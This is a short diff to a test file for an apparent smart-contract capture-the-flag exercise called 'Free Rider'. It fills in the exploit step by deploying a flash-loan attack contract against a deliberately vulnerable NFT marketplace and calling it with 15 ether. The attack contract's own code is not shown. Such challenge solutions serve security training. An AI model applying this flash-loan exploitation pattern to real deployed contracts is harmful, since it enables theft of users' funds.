@@ -105,6 +105,16 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        this.exploitContract = await(await ethers.getContractFactory('FlashLoanFreeRider', attacker)).deploy(
+            this.uniswapPair.address,
+            this.weth.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address,
+          );
+
+        await this.exploitContract.exploit(ethers.utils.parseEther("15"));
     });
 
     after(async function () {
